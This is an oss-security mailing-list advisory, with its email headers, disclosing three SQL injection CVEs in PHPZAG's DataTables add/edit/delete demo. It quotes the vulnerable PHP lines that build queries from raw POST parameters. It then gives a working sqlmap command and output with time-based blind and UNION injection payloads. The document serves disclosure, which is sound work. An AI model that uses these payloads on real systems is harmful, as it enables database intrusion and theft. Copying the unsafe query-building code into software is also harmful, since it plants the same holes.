X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7691" "Thursday" "9" "July" "2020" "09:27:13" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<0612DFF1-F44E-4A33-9AC7-F5681B597AAB@me.com>" "70" "[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql" nil nil nil "7" "2020070913:27:13" "[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql" (number mark "U       larry0@me.co Jul  9   70/7691  " thread-indent "\"[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11459 invoked by uid 550); 9 Jul 2020 13:27:28 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11414 invoked from network); 9 Jul 2020 13:27:28 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
	t=1594301235; bh=yU3L7G/SjskYgQE0bd1n3yEQD27yEMwMemVYKZLMpWo=;
	h=Date:Subject:From:To:Message-ID:Content-type;
	b=AEz5TP66OTzLp0DRCqKYpA2L4t3r+iQYSd3zGgA//EehQ/u6W++XxDsrQyTav/WBe
	 zXE0mw83dcM+uSzDaHoHBF69XsH05W5X8zEoi8oEv9EM61QCr8sMFNgApKd4i5i9EX
	 7CUOgQzTdmQ4UFb59p5yc1y81WNbyeUE6zizil3cvIChEWSfU83v5ulkDN8nRRlK35
	 0dQ5RhXzsyV+x5JY4YrdplEKz7c41s1DP/lg5/ae91v8aKSJHSHrMaqnapF2ooekpH
	 vxHB1p8Sbk8tY9LbpbkD2dfRXk2DiU5HGRIrZYfmYi6+/cJoM9EexqL4aIx3BdB7sn
	 dXCC9yNOj3Uwg==
User-Agent: Microsoft-MacOutlook/16.38.20061401
Date: Thu, 09 Jul 2020 09:27:13 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
To: Open Security <oss-security@lists.openwall.com>
Message-ID: <0612DFF1-F44E-4A33-9AC7-F5681B597AAB@me.com>
Thread-Topic: SQL Injection in search field of phpzag live add edit delete
 data tables records with ajax php mysql
Mime-version: 1.0
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: 7bit
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.235,18.0.687
 definitions=2020-07-09_07:2020-07-09,2020-07-09 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0 malwarescore=0
 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
 mlxlogscore=999 adultscore=0 classifier=spam adjust=0 reason=mlx
 scancount=1 engine=8.0.1-2004280000 definitions=main-2007090101
Subject: [oss-security] SQL Injection in search field of phpzag live add edit delete data
 tables records with ajax php mysql

SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql
Author: Larry W. Cashdollar, @_larry0
Date: 2020-05-19
CVE-ID:[CVE-2020-8519][CVE- 2020-8520][CVE- 2020-8521]
Download Site: https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/
Vendor: PHPZAG
Vendor Notified: 2020-05-19
Advisory: http://www.vapidlabs.com/advisory.php?v=213
Description: DataTables is a jQuery JavaScript library to convert simple HTML tables to dynamic feature-rich tables. The jQuery DataTables are very user friendly to list records with live add, edit, delete records without page refresh. Due to this, DataTables used widely in web applications to list records.

Vulnerability:
There is SQL injection in the search function in Records.php:

CVE-2020-8519 SQL injection in search parameter:
 
 20     if(!empty($_POST["search"]["value"])){
 21                         $sqlQuery .= 'where(id LIKE "%'.$_POST["search"]["value"].'%" ';
 22                         $sqlQuery .= ' OR name LIKE "%'.$_POST["search"]["value"].'%" ';
 23                         $sqlQuery .= ' OR designation LIKE "%'.$_POST["search"]["value"].'%" ';
 24                         $sqlQuery .= ' OR address LIKE "%'.$_POST["search"]["value"].'%" ';
 25                         $sqlQuery .= ' OR skills LIKE "%'.$_POST["search"]["value"].'%") ';
 26                 }
 27

CVE-2020-8520  SQL Injection in line 29 with 'order' and 'column' parameter:
 
 28                 if(!empty($_POST["order"])){
 29                         $sqlQuery .= 'ORDER BY '.$_POST['order']['0']['column'].' '.$_POST['order']['0']['dir'].' ';
 30                 } else {
 31                         $sqlQuery .= 'ORDER BY id DESC ';
 32                 }

CVE-2020-8521 SQL Injection line 35 with 'start' and 'length' parameters: 

 34                 if($_POST["length"] != -1){
 35                         $sqlQuery .= 'LIMIT ' . $_POST['start'] . ', ' . $_POST['length'];
 36                 }
Exploit Code:
$ sqlmap -u "http://192.168.0.149/live-add-edit-delete-datatables-php-mysql-demo/ajax_action.php" --data "draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[
 5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]="+and+"1&search[regex]=false&action=listRecords" -p "search[value]" --method POST --dbms=mysql --level 2 --risk 2
.
.
[10:39:53] [INFO] POST parameter 'search[value]' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] y
[10:40:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:40:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:40:00] [INFO] target URL appears to be UNION injectable with 6 columns
[10:40:00] [INFO] POST parameter 'search[value]' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search[value]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 203 HTTP(s) requests:
---
Parameter: search[value] (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&colu
 mns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]= and 1") AND (SELECT * FROM (SELECT(SLEEP(5)))KGDc) AND ("Aejs"="Aejs&search[regex]=false&action=listRecords
 
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&colu
 mns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]= and 1") UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717671,0x5a6b657a455263557478797469434e4f506b596f4e5a585668496b6e7464796e6a6f6a596e656b4e,0x717a767171),NULL-- SkNj&search[regex]=false&action=listRecords
---
[10:40:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12




